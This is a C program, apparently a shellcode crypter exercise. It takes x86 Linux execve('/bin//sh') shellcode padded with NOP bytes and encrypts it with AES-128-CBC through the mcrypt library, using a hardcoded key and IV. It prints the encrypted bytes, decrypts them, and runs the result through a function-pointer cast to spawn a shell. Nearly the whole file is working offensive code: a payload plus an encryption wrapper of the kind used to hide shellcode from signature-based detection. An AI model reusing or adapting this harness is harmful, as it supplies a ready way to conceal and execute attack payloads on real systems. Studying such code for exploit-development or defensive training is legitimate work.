#include <stdio.h>
#include <stdlib.h>
#include <string.h>
 
/*
 * MCrypt API available online:
 * http://linux.die.net/man/3/mcrypt
 */
#include <mcrypt.h>
 
#include <math.h>
#include <stdint.h>
#include <stdlib.h>
 
int encrypt(
    void* buffer,
    int buffer_len, /* Because the plaintext could include null bytes*/
    char* IV, 
    char* key,
    int key_len 
){
  MCRYPT td = mcrypt_module_open("rijndael-128", NULL, "cbc", NULL);
  int blocksize = mcrypt_enc_get_block_size(td);
  if( buffer_len % blocksize != 0 ){return 1;}
 
  mcrypt_generic_init(td, key, key_len, IV);
  mcrypt_generic(td, buffer, buffer_len);
  mcrypt_generic_deinit (td);
  mcrypt_module_close(td);
  
  return 0;
}
 
int decrypt(
    void* buffer,
    int buffer_len,
    char* IV, 
    char* key,
    int key_len 
){
  MCRYPT td = mcrypt_module_open("rijndael-128", NULL, "cbc", NULL);
  int blocksize = mcrypt_enc_get_block_size(td);
  if( buffer_len % blocksize != 0 ){return 1;}
  
  mcrypt_generic_init(td, key, key_len, IV);
  mdecrypt_generic(td, buffer, buffer_len);
  mcrypt_generic_deinit (td);
  mcrypt_module_close(td);
  
  return 0;
}
 
 
int main()
{
  MCRYPT td, td2;
  unsigned char * plaintext = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
  char* IV = "AAAAAAAAAAAAAAAA";
  char *key = "0123456789abcdef";
  int keysize = 16; /* 128 bits */
  unsigned char buffer[32];
  int counter; 
  int buffer_len = 32;


  
 for ( counter = 0; counter < buffer_len; counter++){
   buffer[counter]=0x90;
  }

  strncpy(buffer, plaintext, buffer_len);

  int plain_len = strlen(plaintext);
   
  printf("==Plain Binary==\n");
  for ( counter = 0; counter < plain_len; counter++){
    printf("%02x",plaintext[counter]);
  } 

  encrypt(buffer, buffer_len, IV, key, keysize); 
  
  printf("\n==Encrypted  Binary==\n"); 
  
  for ( counter = 0; counter < buffer_len; counter++){
   printf("\\x%02x",buffer[counter]);
  }
 
  decrypt(buffer, buffer_len, IV, key, keysize); 
  
  printf("\n==decrypted  Binary==\n"); 
  for ( counter = 0; counter < buffer_len; counter++){

    printf("\\x%02x",buffer[counter]);
  } 
  printf("\n");
  printf("Shellcode Length:  %d\n", strlen(buffer));
  int (*ret)() = (int(*)())buffer;
  ret();


  return 0;
}
